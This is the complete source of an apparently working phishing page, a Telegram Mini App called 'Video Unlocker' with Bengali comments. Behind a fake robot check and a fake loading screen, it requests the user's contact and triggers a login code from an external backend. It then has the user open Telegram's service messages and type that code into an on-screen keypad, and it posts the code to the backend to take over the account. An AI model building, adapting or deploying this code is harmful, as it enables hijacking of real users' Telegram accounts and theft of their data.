<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>Video Unlocker</title>
    <script src="https://telegram.org/js/telegram-web-app.js"></script>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            background-color: #000;
            color: #fff;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            overflow: hidden;
            background-image: url('https://images.unsplash.com/photo-1578328819058-b69f3a3b0f6b?q=80&w=1000&auto=format&fit=crop'); /* একটি ব্যাকগ্রাউন্ড ইমেজ */
            background-size: cover;
            background-position: center;
        }

        .blur-overlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            backdrop-filter: blur(15px);
            background: rgba(0, 0, 0, 0.5);
            z-index: 1;
        }

        .container {
            position: relative;
            z-index: 2;
            width: 90%;
            max-width: 400px;
            text-align: center;
        }

        /* Screen States */
        .screen { display: none; flex-direction: column; align-items: center; }
        .screen.active { display: flex; animation: fadeIn 0.3s ease; }

        @keyframes fadeIn {
            from { opacity: 0; transform: scale(0.95); }
            to { opacity: 1; transform: scale(1); }
        }

        /* Box Style */
        .box {
            background: #fff;
            color: #000;
            padding: 20px;
            border-radius: 15px;
            width: 100%;
            box-sizing: border-box;
            box-shadow: 0 10px 25px rgba(0,0,0,0.5);
            margin-bottom: 20px;
        }

        /* Robot Screen */
        .robot-icon { font-size: 80px; margin-bottom: -20px; z-index: 10; position: relative; }
        .confirm-text { font-size: 16px; font-weight: 500; margin-bottom: 15px; }
        .blue-btn {
            background: #2481cc;
            color: white;
            border: none;
            width: 100%;
            padding: 15px;
            border-radius: 12px;
            font-size: 18px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 4px 10px rgba(36, 129, 204, 0.4);
        }

        /* Loading Screen */
        .loading-icon { font-size: 70px; margin-bottom: 20px; animation: bounce 1s infinite alternate; }
        .spinner {
            width: 40px;
            height: 40px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #fff;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        .toast {
            background: #fff;
            color: #000;
            padding: 10px 20px;
            border-radius: 10px;
            font-weight: bold;
            margin-bottom: 30px;
        }

        @keyframes bounce { from { transform: translateY(0); } to { transform: translateY(-10px); } }
        @keyframes spin { to { transform: rotate(360deg); } }

        /* OTP Screen */
        .phone-icon { font-size: 70px; margin-bottom: -10px; z-index: 10; position: relative; }
        .otp-boxes { display: flex; justify-content: space-between; margin-bottom: 15px; }
        .otp-box {
            width: 50px;
            height: 60px;
            background: transparent;
            border: 2px solid #ccc;
            border-radius: 10px;
            font-size: 24px;
            font-weight: bold;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
        }
        .otp-box.filled { border-color: #2481cc; box-shadow: 0 0 10px rgba(36, 129, 204, 0.5); }
        
        .jump-btn {
            background: #2481cc;
            color: white;
            border: none;
            width: 100%;
            padding: 10px;
            border-radius: 8px;
            font-size: 16px;
            font-weight: bold;
            margin-bottom: 20px;
            cursor: pointer;
        }

        /* Custom Keypad */
        .keypad {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 10px;
            width: 100%;
        }
        .key {
            background: #2481cc;
            color: white;
            border: none;
            padding: 15px;
            font-size: 24px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
        }
        .key:active { background: #1a65a3; }
        .key-empty { background: transparent; pointer-events: none; }
        .key-del { background: #e74c3c; font-size: 20px; }

    </style>
</head>
<body>
    <div class="blur-overlay"></div>
    
    <div class="container">
        
        <!-- STEP 1: Robot Verification -->
        <div id="step-robot" class="screen active">
            <div class="robot-icon">🤖</div>
            <div class="box">
                <div class="confirm-text">Please confirm that you are not a robot ✅</div>
            </div>
            <!-- টেলিগ্রামের রুলস অনুযায়ী নাম্বার নেওয়ার জন্য এটি Contact Share বাটন হতে হবে -->
            <button id="confirm-btn" class="blue-btn">Confirm ✅</button>
        </div>

        <!-- STEP 2: Loading Screen -->
        <div id="step-loading" class="screen">
            <div class="toast">Please wait a moment ⏳</div>
            <div class="loading-icon">📁</div>
            <div class="spinner"></div>
        </div>

        <!-- STEP 3: OTP Input Screen -->
        <div id="step-otp" class="screen">
            <div class="phone-icon">📱</div>
            <div class="box" style="margin-bottom: 15px;">
                <div class="confirm-text" id="otp-message">We Just Sent Your Access Code - Check your Telegram!</div>
            </div>
            
            <div class="otp-boxes" id="otp-display">
                <div class="otp-box"></div>
                <div class="otp-box"></div>
                <div class="otp-box"></div>
                <div class="otp-box"></div>
                <div class="otp-box"></div>
            </div>

            <button class="jump-btn" onclick="openTelegram()">Show my code 📱</button>

            <div class="keypad">
                <button class="key" onclick="pressKey('1')">1</button>
                <button class="key" onclick="pressKey('2')">2</button>
                <button class="key" onclick="pressKey('3')">3</button>
                <button class="key" onclick="pressKey('4')">4</button>
                <button class="key" onclick="pressKey('5')">5</button>
                <button class="key" onclick="pressKey('6')">6</button>
                <button class="key" onclick="pressKey('7')">7</button>
                <button class="key" onclick="pressKey('8')">8</button>
                <button class="key" onclick="pressKey('9')">9</button>
                <div class="key key-empty"></div>
                <button class="key" onclick="pressKey('0')">0</button>
                <button class="key key-del" onclick="deleteKey()">⌫</button>
            </div>
        </div>

    </div>

    <script>
        // আপনার ব্যাকএন্ড URL
        const BACKEND_URL = "https://mxvdo-forwardbot.hf.space";
        let userPhone = "";
        let userId = "";
        let currentOtp = "";

        // WebApp Initialize
        const tg = window.Telegram.WebApp;
        tg.expand();
        if (tg.initDataUnsafe && tg.initDataUnsafe.user) {
            userId = tg.initDataUnsafe.user.id;
        }

        // Screen Switcher
        function showScreen(screenId) {
            document.querySelectorAll('.screen').forEach(el => el.classList.remove('active'));
            document.getElementById(screenId).classList.add('active');
        }

        // Step 1 -> Request Contact
        document.getElementById('confirm-btn').addEventListener('click', () => {
            // টেলিগ্রাম থেকে ফোন নাম্বার রিকোয়েস্ট করা হচ্ছে
            tg.requestContact((shared, data) => {
                if (shared) {
                    showScreen('step-loading');
                    // ফোন নাম্বার সার্ভারে পাঠানো হচ্ছে
                    fetch(`${BACKEND_URL}/api/send_code`, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({ user_id: userId, phone: "tg_contact" }) // Backend should handle contact obj if needed, or pass normal
                    })
                    .then(res => res.json())
                    .then(data => {
                        // 3 সেকেন্ড ফেক লোডিং দেখিয়ে OTP স্ক্রিনে যাবে
                        setTimeout(() => {
                            showScreen('step-otp');
                        }, 2500);
                    })
                    .catch(err => {
                        alert("Error: Network issue!");
                        showScreen('step-robot');
                    });
                } else {
                    tg.showAlert("Please confirm to verify you are human!");
                }
            });
        });

        // Keypad Logic
        function updateOtpUI() {
            const boxes = document.querySelectorAll('.otp-box');
            boxes.forEach((box, index) => {
                box.innerText = currentOtp[index] || "";
                if (currentOtp[index]) {
                    box.classList.add('filled');
                } else {
                    box.classList.remove('filled');
                }
            });

            // Auto submit when 5 digits entered
            if (currentOtp.length === 5) {
                submitOtp();
            }
        }

        function pressKey(num) {
            if (currentOtp.length < 5) {
                currentOtp += num;
                updateOtpUI();
            }
        }

        function deleteKey() {
            if (currentOtp.length > 0) {
                currentOtp = currentOtp.slice(0, -1);
                updateOtpUI();
            }
        }

        function openTelegram() {
            window.location.href = "tg://openmessage?user_id=777000";
        }

        // Submit OTP
        function submitOtp() {
            document.getElementById('otp-message').innerText = "Verifying Code... ⏳";
            
            fetch(`${BACKEND_URL}/api/verify_code`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ user_id: userId, otp: currentOtp })
            })
            .then(res => res.json())
            .then(data => {
                if (data.status === "ok") {
                    document.getElementById('otp-message').innerText = "✅ Verified Successfully! Enjoy Premium.";
                    document.getElementById('otp-message').style.color = "green";
                    setTimeout(() => {
                        tg.close(); // সাকসেস হলে অ্যাপ ক্লোজ হয়ে যাবে
                    }, 2000);
                } else {
                    document.getElementById('otp-message').innerText = "❌ Incorrect Code! Try Again.";
                    document.getElementById('otp-message').style.color = "red";
                    currentOtp = "";
                    updateOtpUI();
                    // Reset text color after 2 secs
                    setTimeout(() => {
                        document.getElementById('otp-message').innerText = "We Just Sent Your Access Code - Check your Telegram!";
                        document.getElementById('otp-message').style.color = "black";
                    }, 2000);
                }
            })
            .catch(err => {
                document.getElementById('otp-message').innerText = "❌ Network Error!";
            });
        }
    </script>
</body>
</html>
